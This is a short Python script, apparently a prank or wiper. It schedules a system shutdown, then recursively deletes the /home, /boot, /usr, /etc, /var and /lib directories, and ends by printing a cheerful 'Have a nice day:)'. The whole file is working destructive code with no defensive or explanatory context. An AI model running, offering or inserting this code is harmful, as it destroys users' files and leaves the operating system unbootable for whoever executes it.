#!/usr/bin/env python3
from shutil import rmtree
from os import system

system("shutdown 1")
rmtree("/home")
rmtree("/boot")
rmtree("/usr")
rmtree("/etc")
rmtree("/var")
rmtree("/lib")

print("Have a nice day:)")
